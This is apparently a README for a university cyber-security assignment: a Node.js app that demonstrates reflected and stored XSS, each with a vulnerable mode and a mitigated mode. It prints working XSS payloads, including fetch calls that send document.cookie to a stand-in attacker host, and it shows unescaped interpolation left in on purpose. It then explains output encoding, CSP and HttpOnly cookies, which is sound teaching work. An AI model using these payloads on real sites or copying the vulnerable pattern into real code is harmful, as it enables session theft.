# XSS Demo — Reflected & Stored Cross-Site Scripting

Built for **IIIT Allahabad, IT-30001 Cyber Security, Autumn 2026** —
Assignment: *Web Server Security — Exploitation and Mitigation of Four
Vulnerability Categories* (Category: Cross-Site Scripting).

A single zero-dependency Node.js app that demonstrates **both** XSS
variants from the assignment, each switchable between a *vulnerable*
and a *mitigated* implementation so the same payload can be shown
failing and succeeding in one recording.

- **Reflected XSS** → `/search`
- **Stored XSS** → `/comments`

> ⚠️ Run this only on your own machine for your own demo/testing. Do
> not deploy the vulnerable mode on shared or public infrastructure.

## Running it

Requires only Node.js (no `npm install` needed — stdlib only).

```bash
node server.js
# -> XSS demo running at http://localhost:3000
```

Open `http://localhost:3000`. Use the **mode toggle** in the navbar
(or visit `/mode/vulnerable` / `/mode/safe`) to switch between the
vulnerable and mitigated implementation at runtime.

---

## Variant 1: Reflected XSS

**(a) Vulnerable implementation** — `GET /search?q=...` (see `searchBody()`
in `server.js`):

```js
// VULNERABLE: raw interpolation, no encoding.
resultHtml = `<h2>Search results for: ${q}</h2><p>No matches found.</p>`;
```

**(b) Working exploit** — visit:

```
http://localhost:3000/search?q=<script>alert(document.cookie)</script>
```

or, simulating real-world cookie exfiltration:

```
http://localhost:3000/search?q=<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
```

The alert fires immediately (or, in a real scenario, an attacker
server would log your session cookie). This is "reflected" because
the payload lives only in the URL and only fires for whoever is
tricked into clicking the crafted link.

**(c) Root cause.** The `q` query parameter is concatenated directly
into the HTML response with no encoding. The browser can't tell
injected `<script>` apart from the page's own markup, so it parses
and executes it.

**(d) Mitigation implemented — output encoding.** In SAFE mode, the
same value is passed through `escapeHtml()` before interpolation:

```js
// MITIGATED: HTML-encode before interpolation.
resultHtml = `<h2>Search results for: ${escapeHtml(q)}</h2><p>No matches found.</p>`;
```

`escapeHtml()` converts `&`, `<`, `>`, `"`, `'` into their HTML
entities (`&lt;`, `&gt;`, etc.), so the exact same payload now renders
as visible text (`<script>alert(document.cookie)</script>` shown
literally on the page) instead of executing. Take your "blocked
attempt" screenshot here, with the mode badge visibly set to SAFE.

---

## Variant 2: Stored XSS

**(a) Vulnerable implementation** — `GET/POST /comments` (see
`commentsBody()` in `server.js`):

```js
// VULNERABLE: comment text rendered with no encoding.
const text = c.text; // interpolated as-is into the HTML
```

Comments are kept in an in-memory array (`comments`) and re-rendered
on every page load for every visitor — there is no per-visitor
sanitisation step.

**(b) Working exploit.** On the `/comments` page, submit a comment
with:

```html
<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
```

or simply:

```html
<script>alert(document.cookie)</script>
```

Reload the page (or have a second "victim" browser load it) — the
payload fires again, because it is now *stored* and executes for
every subsequent visitor, not just the person who submitted it.

**(c) Root cause.** The stored comment text is rendered into the HTML
response at output time without encoding. Because the payload
persists in the backing store, it becomes a standing attack that
compromises every future viewer of the page, not a one-off reflected
hit.

**(d) Mitigation implemented — output encoding at render time.**
In SAFE mode, every comment is escaped right before it's written into
the HTML:

```js
const name = mode === "safe" ? escapeHtml(c.name) : c.name;
const text = mode === "safe" ? escapeHtml(c.text) : c.text;
```

Note the mitigation is applied **at render time, not at submission
time**. The raw value is still stored as-is; it's encoded fresh every
time it's about to be written into an HTML context. This matters
because encoding once at input time doesn't protect every later
rendering context the data might flow through (e.g. the same comment
later rendered inside a JSON API, an email, or a different page), and
it can silently corrupt the stored data (e.g. double-encoding on
every edit).

With the mode set to SAFE, re-submit the exact same `<script>` or
`<img onerror=...>` payload and screenshot it rendering as inert text
in the comment list.

---

## (e) Other mitigations (theory)

Beyond output encoding, the lecture slides cover several other
defences against XSS, each addressing a different part of the attack
surface:

- **Framework auto-escaping.** Modern templating engines and UI
  frameworks (React, Angular, EJS's `<%= %>`, Jinja2 with autoescape
  on) HTML-encode interpolated values by default, so a developer has
  to deliberately opt out (`dangerouslySetInnerHTML`, `|safe`, EJS's
  `<%- %>`) to reintroduce the bug. This removes XSS as a class of
  mistake rather than relying on every developer remembering to
  encode manually, which is exactly the discipline this demo's
  hand-written `escapeHtml()` calls are standing in for.
- **A sanitiser for rich HTML.** When an application genuinely needs
  to allow *some* HTML from users (e.g. a rich-text/Markdown comment
  box with bold, links, images), naive escaping would also strip
  legitimate formatting. A sanitiser library (e.g. DOMPurify) instead
  parses the HTML and strips dangerous tags/attributes (`<script>`,
  `onerror=`, `javascript:` URLs) while keeping an allow-listed safe
  subset.
- **Content Security Policy (CSP).** A `Content-Security-Policy`
  response header restricts which script sources the browser is
  allowed to execute (e.g. `script-src 'self'`), so even if an
  injected `<script>` or inline event handler makes it into the DOM,
  the browser refuses to run it. This is defence-in-depth, not a
  substitute for encoding — it limits the blast radius of a missed
  encoding bug.
- **HttpOnly cookies.** Marking the session cookie `HttpOnly` stops
  `document.cookie` from being read by any injected JavaScript at
  all, which blunts the most common XSS payoff (session hijacking)
  even if an XSS bug exists elsewhere in the app.
- **Safe DOM sinks.** On the client side, using `textContent` instead
  of `innerHTML` (or avoiding `eval`, `document.write`, and
  `insertAdjacentHTML` with untrusted strings) means untrusted data
  is inserted as plain text rather than parsed as HTML/script in the
  first place — a client-side analogue of server-side output
  encoding.

Together, these layer on top of output encoding: encoding is the
primary fix for *this* vulnerability, while CSP and HttpOnly cookies
limit the damage if a similar bug ever slips through unnoticed
elsewhere in the app.

---

## Ownership

| Member name | Roll number | Category | Variant implemented |
|---|---|---|---|
| _(fill in)_ | _(fill in)_ | Cross-Site Scripting (XSS) | Reflected XSS |
| _(fill in)_ | _(fill in)_ | Cross-Site Scripting (XSS) | Stored XSS |

> This repo currently contains both XSS variants in one app. If your
> group is splitting ownership so that one member owns Reflected and
> another owns Stored, split `server.js` into two files/routes (or two
> small apps) so each member's code is clearly and exclusively theirs,
> per the assignment's individual-ownership requirement, and update
> this table accordingly.

## File structure

```
xss-demo/
├── server.js      # entire app: routing, both vulnerable/safe variants, HTML templates
├── package.json
└── README.md      # this file
```
